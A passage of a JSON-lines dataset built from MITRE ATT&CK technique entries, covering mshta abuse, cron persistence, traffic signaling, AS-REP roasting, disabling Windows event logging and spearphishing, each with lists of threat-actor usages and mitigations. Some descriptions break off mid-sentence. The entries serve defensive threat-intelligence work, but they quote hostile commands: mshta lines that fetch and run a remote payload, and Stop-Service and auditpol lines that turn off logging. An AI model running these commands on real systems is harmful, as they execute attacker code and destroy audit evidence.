DLL into memory, once the initial dropper executable is launched.", "VaporRage can deobfuscate XOR-encoded shellcode prior to execution.", "Higaisa used certutil to decode Base64 binaries at runtime and a 16-byte XOR key to decrypt data.", "Expand can be used to decompress a local or remote CAB file into an executable.", "SQLRat has scripts that are responsible for deobfuscating additional scripts.", "FatDuke can decrypt AES encrypted C2 communications.", "Bisonal decodes strings in the malware using XOR and RC4.", "SombRAT can run <code>upload</code> to decrypt and upload files from storage.", "Goopy has used a polymorphic decryptor to decrypt itself at runtime.", "PoetRAT has used LZMA and base64 libraries to decode obfuscated scripts.", "Exaramel for Linux can decrypt its configuration file.", "WIRTE has decoded a base64 encoded document which was embedded in a VBS script.", "Zebrocy decodes its secondary payload and writes it to the victim’s machine. Zebrocy also uses AES and XOR to decrypt strings and payloads.", "WellMail can decompress scripts received from C2.", "Waterbear has the ability to decrypt its RC4 encrypted payload for execution.", "MuddyWater decoded base64-encoded PowerShell commands using a VBS file.", "PipeMon can decrypt password-protected executables.", "OopsIE concatenates then decompresses multiple resources to load an embedded .Net Framework assembly.", "Siloscape has decrypted the password of the C2 server with a simple byte by byte XOR. Siloscape also writes both an archive of Tor and the <code>unzip</code> binary to disk from data embedded within the payload using Visual Studio’s Resource Manager.", "ShimRat has decompressed its core DLL using shellcode once an impersonated antivirus component was running on a system.", "Ecipekac has the ability to decrypt fileless loader modules.", "BoomBox can decrypt AES-encrypted files downloaded from C2.", "Azorult uses an XOR key to decrypt content and uses Base64 to decode the C2 address.", "Lucifer can decrypt its C2 address upon execution.", "BLINDINGCAN has used AES and XOR to decrypt its DLLs.", "ZeroT shellcode decrypts and decompresses its RC4-encrypted payload.", "APT39 has used malware to decrypt encrypted CAB files.", "Proton uses an encrypted file to store commands and configuration values.", "DDKONG decodes an embedded configuration using XOR.", "QUADAGENT uses AES and a preshared key to decrypt the custom Base64 routine used to encode strings and scripts.", "Dtrack has used a decryption routine that is part of an executable physical patch.", "Turla has used a custom decryption routine, which pulls key and salt values from other artifacts such as a WMI filter or PowerShell Profile, to decode encrypted PowerShell payloads.", "Conti has decrypted its payload using a hardcoded AES-256 key.", "Cardinal RAT decodes many of its artifacts and is decrypted (AES-128) after being downloaded.", "Netwalker's PowerShell script can decode and decrypt multiple layers of obfuscation, leading to the Netwalker DLL being loaded into memory.", "BBSRAT uses Expand to decompress a CAB file into executable content.", "Okrum's loader can decrypt the backdoor code, embedded within the loader or within a legitimate PNG file. A custom XOR cipher or RC4 is used for decryption.", "PlugX decompresses and decrypts itself using the Microsoft API call RtlDecompressBuffer.", "ComRAT has used unique per machine passwords to decrypt the orchestrator payload and a hardcoded XOR key to decrypt its communications module. ComRAT has also used a unique password to decrypt the file used for its hidden file system.", "Remexi decrypts the configuration data using XOR with 25-character keys.", "Molerats decompresses ZIP files once on the victim machine.", "SUNSPOT decrypts SUNBURST, which was stored in AES128-CBC encrypted blobs.  ", "Cobalt Strike can deobfuscate shellcode using a rolling XOR and decrypt metadata from Beacon sessions.", "Stuxnet decrypts resources that are loaded into memory and executed.", "Ebury has verified C2 domain ownership by decrypting the TXT record using an embedded RSA public key.", "WastedLocker's custom cryptor, CryptOne, used an XOR based algorithm to decrypt the payload.", "xCaon has decoded strings from the C2 server before executing commands. ", "BendyBear has decrypted function blocks using a XOR key during runtime to evade detection.", "Ramsay can extract its agent from the body of a malicious document.\t", "Pillowmint has been decompressed by included shellcode prior to being launched.\t", "OnionDuke can use a custom decryption algorithm to decrypt strings.", "IronNetInjector has the ability to decrypt embedded .NET and PE payloads.", "EnvyScout can deobfuscate and write malicious ISO files to disk.", "Industroyer decrypts code to connect to a remote C2 server.", "PS1 can use an XOR key to decrypt a PowerShell loader and payload binary.", "LightNeuron has used AES and XOR to decrypt configuration files and commands.", "AuditCred uses XOR and RC4 to perform decryption on the code functions.", "Dyre decrypts resources needed for targeting the victim.", "Crimson can decode its encoded PE file prior to execution.", "ABK has the ability to decrypt AES encrypted payloads.", "P.A.S. Webshell can use a decryption mechanism to process a user supplied password and allow execution.", "Chaes has decrypted an AES encrypted binary file to trigger the download of other files. ", "NOKKI uses a unique, custom de-obfuscation technique.", "TSCookie has the ability to decrypt, load, and execute a DLL and its resources.", "SharpStage has decompressed data received from the C2 server.", "Final1stspy uses Python code to deobfuscate base64-encoded strings.", "CookieMiner has used Google Chrome's decryption and extraction operations.", "Sibot can decrypt data received from a C2 and save to a file.", "Valak has the ability to decode and decrypt downloaded files.", "Winnti for Linux has decoded XOR encoded strings holding its configuration upon execution.", "Turian has the ability to use a XOR decryption key to extract C2 server domains and IP addresses.", "During execution, Threat Group-3390 malware deobfuscates and decompresses code that was encoded with Metasploit’s shikata_ga_nai encoder as well as compressed with LZNT1 compression.", "Rocke has extracted tar.gz files after downloading them from a C2 server.", "Darkhotel has decrypted strings and imports using RC4 during execution.", "FYAnti has the ability to decrypt an embedded .NET module.", "GoldMax has decoded and decrypted the configuration file when executed.", "Lokibot has decoded and decrypted its stages multiple times using hard-coded keys to deliver the final payload, and has decoded its server response hex string using XOR.", "Bankshot decodes embedded XOR strings.", "Avaddon has decrypted encrypted strings.", "Egregor has been decrypted before execution. ", "WindTail has the ability to decrypt strings using hard-coded AES keys.", "AppleJeus has decoded files received from a C2.", "Hancitor has decoded Base64 encoded URLs to insert a recipient’s name into the filename of the Word document. Hancitor has also extracted executables from ZIP files.", "YAHOYAH decrypts downloaded files before execution.", "Shamoon decrypts ciphertext using an XOR cipher and a base64-encoded string.\t", "Raindrop decrypted its Cobalt Strike payload using an AES-256 encryption algorithm in CBC mode with a unique key per sample.", "TrickBot decodes the configuration data and modules.", "Smoke Loader deobfuscates its code.", "KONNI has used certutil to download and decode base64 encoded strings. ", "Grandoreiro can decrypt its encrypted internal strings.", "Tropic Trooper used shellcode with an XOR algorithm to decrypt a payload. Tropic Trooper also decrypted image files which contained a payload.", "BOOSTWRITE has used a a 32-byte long multi-XOR key to decode data inside its payload.\t", "A OilRig macro has run a PowerShell command to decode file contents. OilRig has also used certutil to decode base64-encoded files on victims.", "Imminent Monitor has decoded malware components that are then dropped to the system.", "QakBot can deobfuscate and re-assemble code strings for execution.", "ISMInjector uses the <code>certutil</code> command to decode a payload file.", "CoinTicker decodes the initially-downloaded hidden encoded file using OpenSSL.", "NativeZone can decrypt and decode embedded  Cobalt Strike beacon stage shellcode.", "HiddenWasp uses a cipher to implement a decoding function.", "PUNCHBUGGY has used PowerShell to decode base64-encoded assembly.", "Gamaredon Group tools decrypted additional payloads from the C2. Gamaredon Group has also decoded base64-encoded source code of a downloader.", "WellMess can decode and decrypt data received from C2.", "Starloader decrypts and executes shellcode from a file called Stars.jps.", "BBK has the ability to decrypt AES encrypted payloads.", "Volgmer deobfuscates its strings and APIs once its executed.", "Sandworm Team's VBS backdoor can decode Base64-encoded data and save it to the %TEMP% folder. The group also decrypted received information using the Triple DES algorithm and decompresses it using GZip.", "RGDoor decodes Base64 strings and decrypts strings using a custom XOR algorithm.", "OSX/Shlayer can base64-decode and AES-decrypt downloaded payloads. Versions of OSX/Shlayer pass encrypted and password-protected code to <code>openssl</code> and then write the payload to the <code>/tmp</code> folder.", "Rising Sun decrypted itself using a single-byte XOR scheme. Additionally, Rising Sun can decrypt its configuration data at runtime.\t", "REvil can decode encrypted strings to enable execution of commands and payloads.", "FinFisher extracts and decrypts stage 3 malware, which is stored in encrypted resources.", "LiteDuke has the ability to decrypt and decode multiple layers of obfuscation.", "One TYPEFRAME variant decrypts an archive using an RC4 key, then decompresses and installs the decrypted malicious DLL module. Another variant decodes the embedded file by XORing it with the value \"0x35\".", "RegDuke can decrypt strings with a key either stored in the Registry or hardcoded in the code.", "Kobalos decrypts strings right after the initial communication, but before the authentication process. ", "Babuk has the ability to unpack itself into memory using XOR.", "Carbon decrypts task and configuration files for execution.", "InvisiMole can decrypt, unpack and load a DLL from its resources, or from blobs encrypted with Data Protection API, two-key triple DES, and variations of the XOR cipher.", "TEARDROP was decoded using a custom rolling XOR algorithm to execute a customized Cobalt Strike payload.", "An APT28 macro uses the command <code>certutil -decode</code> to decode contents of a .txt file storing the base64 encoded payload.", "MegaCortex has used a Base64 key to decode its components.", "After checking for the existence of two files, keyword_parm.txt and parm.txt, MESSAGETAP XOR decodes and read the contents of the files. ", "Bazar can decrypt downloaded payloads. Bazar also resolves strings and API calls at runtime.", "Skidmap has the ability to download, unpack, and decrypt tar.gz files . ", "Leviathan has used a DLL known as SeDll to decrypt and execute other JavaScript backdoors.", "Zeus Panda decrypts strings in the code during the execution process.", "Drovorub has de-obsfuscated XOR encrypted payloads in WebSocket messages.", "RogueRobin decodes an embedded executable using base64 and decompresses it.", "BADFLICK can decode shellcode using a custom rotating XOR cipher.", "Avenger has the ability to decrypt files downloaded from C2.", "Machete’s downloaded data is decrypted using AES.", "Bandook has decoded its PowerShell script.", "Hildegard has decrypted ELF files with AES.", "Aria-body has the ability to decrypt the loader configuration and payload DLL.", "Astaroth uses a fromCharCode() deobfuscation method to avoid explicitly writing execution commands and to hide its code. "], "is_subtechnique": false}
{"text": " Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications) Files may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))</code> They may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code> Mshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)", "idx": "https://attack.mitre.org/techniques/T1218/005", "title": "Mshta", "entity": "Mshta", "entity_type": "techniques", "entity_context": ["NanHaiShu uses mshta.exe to load its program and files.", "TA551 has used mshta.exe to execute malicious payloads.", "Mustang Panda has used mshta.exe to launch collection scripts.", "Mshta.exe may not be necessary within a given environment since its functionality is tied to older versions of Internet Explorer that have reached end of life.", "APT32 has used mshta.exe for code execution.", "Inception has used malicious HTA files to drop and execute malware.", "POWERSTATS can use Mshta.exe to execute additional payloads on compromised hosts.", "Kimsuky has used mshta.exe to run malicious scripts on the system.", "FIN7 has used mshta.exe to execute VBScript to execute malicious code on victim systems.", "MuddyWater has used mshta.exe to execute its POWERSTATS payload and to pass a PowerShell one-liner for execution.", "Use application control configured to block execution of <code>mshta.exe</code> if it is not required for a given system or network to prevent potential misuse by adversaries. For example, in Windows 10 and Windows Server 2016 and above, Windows Defender Application Control (WDAC) policy rules may be applied to block the <code>mshta.exe</code> application and to prevent abuse.", "Revenge RAT uses mshta.exe to run malicious scripts on the system.", "Koadic can use MSHTA to serve additional payloads.", "Metamorfo has used mshta.exe to execute a HTA payload. ", "BabyShark has used mshta.exe to download and execute applications from a remote server.", "Xbash can use mshta for executing scripts.", "Sidewinder has used <code>mshta.exe</code> to execute malicious payloads.", "Sibot has been executed via MSHTA application."], "is_subtechnique": true}
{"text": " Adversaries may create and cultivate social media accounts that can be used during targeting. Adversaries can create social media accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage) For operations incorporating social engineering, the utilization of a persona on social media may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single social media site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Establishing a persona on social media may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos. Once a persona has been developed an adversary can use it to create connections to targets of interest. These connections may be direct or may include trying to connect through others.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage) These accounts may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003)).", "idx": "https://attack.mitre.org/techniques/T1585/001", "title": "Social Media Accounts", "entity": "Social Media Accounts", "entity_type": "techniques", "entity_context": ["Leviathan has created new social media accounts for targeting efforts.", "Magic Hound has created fake LinkedIn and other social media accounts to contact targets and convince them--through messages and voice communications--to open malicious links.", "APT32 has set up Facebook pages in tandem with fake websites.", "Cleaver has created fake LinkedIn profiles that included profile photos, details, and connections.", "Fox Kitten has used a Twitter account to communicate with ransomware victims.", "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls.", "Sandworm Team has established social media accounts to disseminate victim internal-only documents and other sensitive data."], "is_subtechnique": true}
{"text": " Adversaries may abuse the <code>cron</code> utility to perform task scheduling for initial or recurring execution of malicious code.(Citation: 20 macOS Common Tools and Techniques) The <code>cron</code> utility is a time-based job scheduler for Unix-like operating systems. The <code> crontab</code> file contains the schedule of cron entries to be run and the specified times for execution. Any <code>crontab</code> files are stored in operating system-specific file paths. An adversary may use <code>cron</code> in Linux or Unix environments to execute programs at system startup or on a scheduled basis for persistence.", "idx": "https://attack.mitre.org/techniques/T1053/003", "title": "Cron", "entity": "Cron", "entity_type": "techniques", "entity_context": ["NETWIRE can use crontabs to establish persistence.", "Penquin can use Cron to create periodic and pre-scheduled background jobs.", "Rocke installed a cron job that downloaded and executed files from the C2.", "APT38 has used cron to create pre-scheduled and periodic background jobs on a Linux system.", "SpeakUp uses cron tasks to ensure persistence. ", "<code>cron</code> permissions are controlled by <code>/etc/cron.allow and /etc/cron.deny</code>. If there is a <code>cron.allow</code> file, then the user or users that need to use <code>cron</code> will need to be listed in the file. <code>cron.deny</code> is used to explicitly disallow users from using cron. If neither files exist, then only the super user is allowed to run cron.", "Review changes to the <code>cron</code> schedule. <code>cron</code> execution can be reviewed within the <code>/var/log</code> directory. To validate the location of the <code>cron</code> log file, check the syslog config at <code>/etc/rsyslog.conf</code> or <code>/etc/syslog.conf</code> ", "Exaramel for Linux uses crontab for persistence if it does not have root privileges.", "Xbash can create a cronjob for persistence if it determines it is on a Linux system.", "Kinsing has used crontab to download and run shell scripts every minute to ensure persistence.", "Janicab used a cron job for persistence on Mac devices.", "Anchor can install itself as a cron job.", "Skidmap has installed itself via crontab."], "is_subtechnique": true}
{"text": " Adversaries may abuse legitimate extensible development features of servers to establish persistent access to systems. Enterprise server applications may include features that allow developers to write and install software or scripts to extend the functionality of the main application. Adversaries may install malicious components to extend and abuse server applications.", "idx": "https://attack.mitre.org/techniques/T1505", "title": "Server Software Component", "entity": "Server Software Component", "entity_type": "techniques", "entity_context": ["Regularly check component software on critical services that adversaries may target for persistence to verify the integrity of the systems and identify if unexpected changes have been made.", "Consider disabling software components from servers when possible to prevent abuse by adversaries.", "Ensure all application component binaries are signed by the correct application developers.", "Do not allow administrator accounts that have permissions to add component software on these services to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems.", "Enforce the principle of least privilege by limiting privileges of user accounts so only authorized accounts can modify and/or add server software components."], "is_subtechnique": false}
{"text": " Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. [Port Knocking](https://attack.mitre.org/techniques/T1205/001)), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software. Adversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s). The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs. On network devices, adversaries may use crafted packets to enable [Network Device Authentication](https://attack.mitre.org/techniques/T1556/004) for standard services offered by the device such as telnet. Such signaling may", "idx": "https://attack.mitre.org/techniques/T1205", "title": "Traffic Signaling", "entity": "Traffic Signaling", "entity_type": "techniques", "entity_context": ["Umbreon provides additional access using its backdoor Espeon, providing a reverse shell upon receipt of a special packet.", "Disable Wake-on-LAN if it is not needed within an environment.", "Mitigation of some variants of this technique could be achieved through the use of stateful firewalls, depending upon how it is implemented.", "Chaos provides a reverse shell is triggered upon receipt of a packet with a special string, sent to any port.", "SYNful Knock can be sent instructions via special packets to change its functionality. Code for new functionality can be included in these messages.", "Ryuk has used Wake-on-Lan to power on turned off systems for lateral movement.", "Winnti for Linux has used a passive listener, capable of identifying a specific magic value before executing tasking, as a secondary command and control (C2) mechanism.", "Kobalos is triggered by an incoming TCP connection to a legitimate service from a specific source port. ", "Penquin will connect to C2 only after sniffing a \"magic packet\" value in TCP or UDP packets matching specific conditions."], "is_subtechnique": false}
{"text": " Adversaries may manipulate hardware components in products prior to receipt by a final consumer for the purpose of data or system compromise. By modifying hardware or firmware in the supply chain, adversaries can insert a backdoor into consumer networks that may be difficult to detect and give the adversary a high degree of control over the system. Hardware backdoors may be inserted into various devices, such as servers, workstations, network infrastructure, or peripherals.", "idx": "https://attack.mitre.org/techniques/T1195/003", "title": "Compromise Hardware Supply Chain", "entity": "Compromise Hardware Supply Chain", "entity_type": "techniques", "entity_context": ["Use Trusted Platform Module technology and a secure or trusted boot process to prevent system integrity from being compromised. Check the integrity of the existing BIOS or EFI to determine if it is vulnerable to modification.  "], "is_subtechnique": true}
{"text": " Adversaries may scan victim IP blocks to gather information that can be used during targeting. Public IP addresses may be allocated to organizations by block, or a range of sequential addresses. Adversaries may scan IP blocks in order to [Gather Victim Network Information](https://attack.mitre.org/techniques/T1590), such as which IP addresses are actively in use as well as more detailed information about hosts assigned these addresses. Scans may range from simple pings (ICMP requests and responses) to more nuanced scans that may reveal host software/versions via server banners or other network artifacts.(Citation: Botnet Scan) Information from these scans may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).", "idx": "https://attack.mitre.org/techniques/T1595/001", "title": "Scanning IP Blocks", "entity": "Scanning IP Blocks", "entity_type": "techniques", "entity_context": ["This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties.", "TeamTNT has scanned specific lists of target IP addresses."], "is_subtechnique": true}
{"text": " Adversaries may use an existing, legitimate external Web service as a means for relaying data to/from a compromised system. Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection. Use of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).", "idx": "https://attack.mitre.org/techniques/T1102", "title": "Web Service", "entity": "Web Service", "entity_type": "techniques", "entity_context": ["DropBook can communicate with its operators by exploiting the Simplenote, DropBox, and the social media platform, Facebook, where it can create fake accounts to control the backdoor and receive instructions.", "Carbon can use Pastebin to receive C2 commands.", "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level.", "BoomBox can downloaded files from Dropbox using a hardcoded access token.", "FIN8 has used <code>sslip.io</code>, a free IP to domain mapping service that also makes SSL certificate generation easier for traffic encryption, as part of their command and control.", "FIN6 has used Pastebin and Google Storage to host content for their operations.\t\n", "Inception has incorporated at least five different cloud service providers into their C2 infrastructure including CloudMe.", "Bazar downloads have been hosted on Google Docs.", "Turla has used legitimate web services including Pastebin, Dropbox, and GitHub for C2 communications.", "Fox Kitten has used Amazon Web Services to host C2.", "NETWIRE has used web services including Paste.ee to host payloads.", "Hildegard has downloaded scripts from GitHub.", "SharpStage has used a legitimate web service for evading detection. ", "Ngrok has been used by threat actors to proxy C2 connections to ngrok service subdomains.", "Gamaredon Group has used GitHub repositories for downloaders which will be obtained by the group's .NET executable on the compromised system.\t", "Sibot has used a legitimate compromised website to download DLLs to the victim's machine.", "GuLoader has the ability to download malware from Google Drive.", "Doki has used the dogechain.info API to generate a C2 address.", "Rocke has used Pastebin, Gitee, and GitLab for Command and Control.", "Web proxies can be used to enforce external network communication policy that prevents use of unauthorized external services.", "APT32 has used Dropbox, Amazon S3, and Google Drive to host malicious downloads.", "SMOKEDHAM has used Google Drive and Dropbox to host files downloaded by victims via malicious links.", "TeamTNT has leveraged iplogger.org to send collected data back to C2. "], "is_subtechnique": false}
{"text": " Adversaries may reveal credentials of accounts that have disabled Kerberos preauthentication by [Password Cracking](https://attack.mitre.org/techniques/T1110/002) Kerberos messages.(Citation: Harmj0y Roasting AS-REPs Jan 2017) Preauthentication offers protection against offline [Password Cracking](https://attack.mitre.org/techniques/T1110/002). When enabled, a user requesting access to a resource initiates communication with the Domain Controller (DC) by sending an Authentication Server Request (AS-REQ) message with a timestamp that is encrypted with the hash of their password. If and only if the DC is able to successfully decrypt the timestamp with the hash of the user’s password, it will then send an Authentication Server Response (AS-REP) message that contains the Ticket Granting Ticket (TGT) to the user. Part of the AS-REP message is signed with the user’s password.(Citation: Microsoft Kerberos Preauth 2014) For each account found without preauthentication, an adversary may send an AS-REQ message without the encrypted timestamp and receive an AS-REP message with TGT data which may be encrypted with an insecure algorithm such as RC4. The recovered encrypted data may be vulnerable to offline [Password Cracking](https://attack.mitre.org/techniques/T1110/002) attacks similarly to [Kerberoasting](https://attack.mitre.org/techniques/T1558/003) and expose plaintext credentials. (Citation: Harmj0y Roasting AS-REPs Jan 2017)(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019) An account registered to a domain, with or without special privileges, can be abused to list all domain accounts that have preauthentication disabled by utilizing Windows tools like [PowerShell](https://attack.mitre.org/techniques/T1059/001) with an LDAP filter. Alternatively, the adversary may send an AS-REQ message for each user. If the DC responds without errors, the account does not require preauthentication and the AS-REP message will already contain the encrypted data. (Citation: Harmj0y", "idx": "https://attack.mitre.org/techniques/T1558/004", "title": "AS-REP Roasting", "entity": "AS-REP Roasting", "entity_type": "techniques", "entity_context": ["Ensure strong password length (ideally 25+ characters) and complexity for service accounts and that these passwords periodically expire. Also consider using Group Managed Service Accounts or another third party product such as password vaulting. ", "Enable AES Kerberos encryption (or another stronger encryption algorithm), rather than RC4, where possible.", "Kerberos preauthentication is enabled by default. Older protocols might not support preauthentication therefore it is possible to have this setting disabled. Make sure that all accounts have preauthentication whenever possible and audit changes to setting. Windows tools such as PowerShell may be used to easily find which accounts have preauthentication disabled.  "], "is_subtechnique": true}
{"text": " Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections. The EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol) Adversaries may target system-wide logging or just that of a particular application. For example, the EventLog service may be disabled using the following PowerShell line: <code>Stop-Service -Name EventLog</code>.(Citation: Disable_Win_Event_Logging) Additionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:”Account Logon” /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco) By disabling Windows event logging, adversaries can operate while leaving less evidence of a", "idx": "https://attack.mitre.org/techniques/T1562/002", "title": "Disable Windows Event Logging", "entity": "Disable Windows Event Logging", "entity_type": "techniques", "entity_context": ["Ensure proper user permissions are in place to prevent adversaries from disabling or interfering with logging.", "Consider periodic review of <code>auditpol</code> settings for Administrator accounts and perform dynamic baselining on SIEM(s) to investigate potential malicious activity. Also ensure that the EventLog service and its threads are properly running.", "Wevtutil can be used to disable specific event logs on the system.", "Ensure proper Registry permissions are in place to prevent adversaries from disabling or interfering logging. The addition of the MiniNT registry key disables Event Viewer.", "Sandworm Team has disabled event logging on compromised systems.", "APT29 used <code>AUDITPOL</code> to prevent the collection of audit logs.", "Threat Group-3390 has used appcmd.exe to disable logging on a victim server.", "Ensure proper process and file permissions are in place to prevent adversaries from disabling or interfering with logging or deleting or modifying .evtx logging files. Ensure .evtx files, which are located at <code>C:\\Windows\\system32\\Winevt\\Logs</code>, have the proper file permissions for limited, legitimate access and audit policies for detection. "], "is_subtechnique": true}
{"text": " Adversaries may register for web services that can be used during targeting. A variety of popular websites exist for adversaries to register for a web-based service that can be abused during later stages of the adversary lifecycle, such as during Command and Control ([Web Service](https://attack.mitre.org/techniques/T1102)) or [Exfiltration Over Web Service](https://attack.mitre.org/techniques/T1567). Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. By utilizing a web service, adversaries can make it difficult to physically tie back operations to them.", "idx": "https://attack.mitre.org/techniques/T1583/006", "title": "Web Services", "entity": "Web Services", "entity_type": "techniques", "entity_context": ["HAFNIUM has acquired web services for use in C2 and exfiltration.", "Turla has created web accounts including Dropbox and GitHub for C2 and document exfiltration.", "ZIRCONIUM has used GitHub to host malware linked in spearphishing e-mails.", "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls.", "IndigoZebra created Dropbox accounts for their operations.", "MuddyWater has used file sharing services including OneHub to distribute tools.", "Lazarus Group has hosted malicious downloads on Github.", "APT32 has set up Dropbox, Amazon S3, and Google Drive to host malicious downloads.", "APT17 has created profile pages in Microsoft TechNet that were used as C2 infrastructure.", "APT29 has registered algorithmically generated Twitter handles that are used for C2 by malware, such as HAMMERTOSS."], "is_subtechnique": true}
{"text": " Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution. Spearphishing may also involve social engineering techniques, such as posing as a trusted source. There are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.", "idx": "https://attack.mitre.org/techniques/T1566/001", "title": "Spearphishing Attachment", "entity": "Spearphishing Attachment", "entity_type": "techniques", "entity_context": ["Silence has sent emails with malicious DOCX, CHM, LNK and ZIP attachments. ", "IndigoZebra sent spearphishing emails containing malicious password-protected RAR attachments.", "Javali has been delivered as malicious e-mail attachments.", "Octopus has been delivered via spearsphishing emails.", "FIN8 has distributed targeted emails containing Word documents with embedded malicious macros.", "Andariel has conducted spearphishing campaigns that included malicious Word or Excel attachments.", "Chaes has been delivered by sending victims a phishing email containing a malicious .docx file.", "Kerrdown has been distributed through malicious e-mail attachments.", "Dragonfly 2.0 used spearphishing with Microsoft Office attachments to target victims.", "Elderwood has delivered zero-day exploits and malware to victims via targeted emails containing malicious attachments.", "Ferocious Kitten has conducted spearphishing campaigns containing malicious documents to lure victims to open the attachments.", "APT30 has used spearphishing emails with malicious DOC attachments.", "Users can be trained to identify social engineering techniques and spearphishing emails.", "Ramsay has been distributed through spearphishing emails with malicious attachments.", "Anti-virus can also automatically quarantine suspicious files.", "AppleSeed has been distributed to victims through malicious e-mail attachments.", "BLINDINGCAN has been delivered by phishing emails containing malicious Microsoft Office documents.", "Wizard Spider has used spearphishing attachments to deliver Microsoft documents containing macros or PDFs containing malicious links to download either Emotet, Bokbot, TrickBot, or Bazar.", "Sharpshooter has sent malicious attachments via emails to targets.", "FIN4 has used spearphishing emails containing attachments (which are often stolen, legitimate documents sent from compromised accounts) with embedded malicious macros.", "OceanSalt has been delivered via spearphishing emails with Microsoft Office attachments.", "Emotet has been delivered by phishing emails containing attachments. ", "OilRig has sent spearphising emails with malicious attachments to potential victims using compromised and/or spoofed email accounts.", "PLATINUM has sent spearphishing emails with attachments to victims as its primary initial access vector.", "Higaisa has sent spearphishing emails containing malicious attachments. ", "RTM has used spearphishing attachments to distribute its malware.", "Tropic Trooper sent spearphishing emails that contained malicious Microsoft Office and fake installer file attachments.", "REvil has been distributed via malicious e-mail attachments including MS Word Documents.", "APT29 has used spearphishing emails with an attachment to deliver files with exploits to initial victims.", "Metamorfo has been delivered to victims via emails with malicious HTML attachments. 